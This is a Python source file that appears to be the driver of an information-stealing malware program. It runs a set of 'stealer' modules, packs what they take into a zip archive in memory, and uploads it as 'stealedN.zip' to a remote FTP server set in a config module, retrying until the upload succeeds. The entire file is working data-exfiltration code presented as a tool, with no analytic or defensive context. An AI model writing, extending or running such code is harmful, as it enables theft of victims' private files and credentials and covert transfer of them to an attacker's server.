import stealers
import config
from os import path
from ftplib import FTP
import traceback
import io
from zipfile import ZipFile


def main():
	# FTP module to connect server
	ftp = FTP()
	ftp.set_debuglevel(config.LOG_LEVEL)
	ftp.connect(config.ADDRESS_HOST, config.ADDRESS_PORT)
	ftp.login(config.LOGIN, config.PASSWORD)
	ftp.cwd(config.FOLDER)

	archive_bytes = io.BytesIO()

	archive = ZipFile(archive_bytes, "w")

	for stealer in stealers.stealers:
		stealer.steal_archive(archive)

	archive.close()

	archive_bytes.seek(0)

	files = ftp.nlst()

	c = 1

	while f'stealed{c}.zip' in files:
		c += 1

	while True:
		try:
			ftp.storbinary(f"STOR {path.basename(f'stealed{c}.zip')}", archive_bytes, config.BUFFER_SIZE)
			break
		except:
			pass
if __name__ == "__main__":
	main()